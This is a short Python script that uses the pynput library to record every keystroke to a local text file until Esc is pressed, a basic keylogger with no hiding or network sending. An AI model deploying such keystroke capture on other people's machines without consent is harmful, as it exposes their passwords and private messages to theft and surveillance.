from pynput import keyboard

def release(key):
    if(key==keyboard.Key.esc):
        return False
    
def press(key):
     try:
        with open('key_log_file.txt','a') as kp:
            if key.char:
                kp.write(key.char)
     except AttributeError:
         with open('key_log_file.txt','a') as kp:
             if key==keyboard.Key.space :
                kp.write(' ')
             elif key==keyboard.Key.enter :
                kp.write('\n')
             else:
                if not key==keyboard.Key.esc :
                    kp.write(f' {key} ')

open('key_log_file.txt','w').close()
with keyboard.Listener(on_release=release,on_press=press) as listener:
    listener.join()